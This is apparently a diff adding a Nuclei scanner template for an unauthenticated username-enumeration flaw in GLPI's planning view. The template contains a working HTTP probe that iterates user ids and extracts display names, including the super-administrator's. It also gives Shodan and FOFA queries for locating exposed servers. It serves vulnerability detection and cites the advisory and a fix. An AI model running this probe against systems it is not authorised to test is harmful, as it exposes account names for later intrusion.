@@ -1,0 +1,60 @@
+id: glpi-planning-user-enum
+
+info:
+  name: GLPI Planning - Unauthenticated Username Enumeration
+  author: wong-hau-pepelu
+  severity: medium
+  description: |
+    GLPI exposes the check availability planning view at front/planning.php without authentication when the genical parameter is set, allowing unauthenticated attackers to enumerate user display names by iterating users_id in Planning::checkAvailability(), leading to full username enumeration and a valid-id oracle with no credentials.
+  impact: |
+    An unauthenticated attacker can enumerate the display names of GLPI users, including the default super-administrator (user id 2), exposing the administrator login and user list to anyone with access to the web interface.
+  remediation: |
+    Upgrade to a GLPI release that adds a right check to the planning form dispatcher (GHSA-j5vx-jrmw-2498). As an interim measure, restrict access to the planning feature to trusted profiles.
+  reference:
+    - https://github.com/advisories/GHSA-j5vx-jrmw-2498
+    - https://github.com/glpi-project/glpi/commit/ddc88ad6e0
+    - https://github.com/glpi-project/glpi
+  classification:
+    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
+    cvss-score: 5.3
+    cwe-id: CWE-862,CWE-306
+  metadata:
+    verified: true
+    max-request: 5
+    vendor: glpi-project
+    product: glpi
+    shodan-query: http.title:"Authentication - GLPI"
+    fofa-query: app="GLPI"
+  tags: glpi,planning,enum,unauth,vuln
+
+http:
+  - raw:
+      - |
+        GET /front/planning.php?genical=1&checkavailability=1&itemtype=User&users_id={{uid}}&begin=2000-01-01&end=2000-01-02 HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      uid:
+        - "2"
+        - "3"
+        - "4"
+        - "5"
+        - "6"
+
+    attack: batteringram
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "fs-4")'
+          - 'status_code == 200'
+        condition: and
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '<th class="fs-4"[^>]*>([^<]+)</th>'
+# digest: 4b0a00483046022100f290c6822728138a676cca1832633a4f7cd572df7cfffc728b21b470093e0426022100a92a2a10dad0b8d6e16565ec2bf9f3e3641e55cd5a728f78894fc21135619c0c:922c64590222798bb761d5b6d8e72950
